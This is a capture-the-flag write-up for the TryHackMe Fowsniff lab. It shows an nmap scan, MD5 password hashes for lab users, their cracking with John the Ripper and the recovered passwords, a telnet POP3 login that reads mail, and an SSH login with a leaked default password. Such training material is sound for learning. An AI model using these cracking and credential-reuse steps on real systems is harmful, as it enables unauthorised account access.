# Fowsniff CTF - TryHackMe

## Using nmap, scan this machine. What ports are open?

I used `nmap [target ip]` to scan for open ports on the machine, revealing:

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
```

Various nmap flags are suggested in the question hint, including:
-A -> Enables OS detection, version detection, script scanning, and traceroute
-p- -> Scans all ports (as opposed to the most common 1000 port scanned by default)
-sV -> Attempts to determine the version of the service running on the port

## Using the information from the open ports. Look around. What can you find?

Port 80 is being used, which suggests an insecure web service is being run.
Port 22 will likely be used later to connect to the machine once a username/password is discovered.

I didn't know much about pop3/imap so had to do some research...

### POP3 vs IMAP [source](https://doteasy.com/blog/pop3-vs-imap-which-one-should-you-use)

- Both protocol are used to ssend email from email servers to email clients.
- POP3 stands for Post Office Protocol and acts like such - the email is downloaded onto the client then removed from the mail server. When accessing emails, a copy of the emails is stored on the client and usually deleted from the mail server, so the emails cannot be accessed by other clients. If the original copies of the emails are kept on the mail server, then they are not synced with those on clients.
- IMAP is the Internet Message Access Protocol, which allowss multiple clients/webmail interfaces to view the sasme emails - since the emails are stored on a central server rather than a client. This means that actions are synced across devices.

IMAP seems to be more common for personal use, whereas POP3 offers added security (single client) and resiliency in case of internet outage. This is a tradeoff for relying on the resilience of the client where the emails are stored, and the lack of availability across multiple devices.

Anyhoo, I used the web browser to visit the IP address. The Fowsniff Corp website describes a data breach that recently occurred, and points to @fowsniffcorp on Twitter. That Twitter page had been taken over by the attacker, who released MD5 hashes of user passwords:

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

I then used the following 'back of the envelope python' to grab just the hashes and save them in another txt file (wasn’t necessary using John the Ripper):

```
with open("hashes.txt") as reader:
    with open("justhashes.txt", 'w') as writer:
        for i in reader:
            writer.write(str(i.split(":")[-1]))
```

I then used John the Ripper to crack the MD5 hases (web tools can also be used):

```
john --wordlist=/root/Desktop/Tools/wordlists/rockyou.txt --format=raw-MD5 hashes.txt
```

Giving us all the passwords (except for stone's!)

```
scoobydoo2       (seina@fowsniff)
orlando12        (parede@fowsniff)
apples01         (tegel@fowsniff)
skyler22         (baksteen@fowsniff)
mailcall         (mauer@fowsniff)
07011972         (sciana@fowsniff)
carp4ever        (mursten@fowsniff)
bilbo101         (mustikka@fowsniff)
```

We can then log in to the pop3 mail server using _seina_'s credentials, using `telnet 10.10.85.5 110`. We can then log in as _seina_ and retrieve her emails.

```
USER seina
+OK
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
.
RETR 1
RETR 2
```

We find out:
- That there was/is an SQL database vulnerability
- That the temporary SSH password is S1ck3nBluff+secureshell
- Devin/seina has been away so may not have changed their password, and Skyler/bakesteen hasn't read AJ Stone's message about the SSH password, so likely hasn't changed it from the default.

And as suspected, we can SSH into baksteen's account with the default password. We can then check the groups that baksteen is in with `groups baksteen` - _users_ and _baksteen_.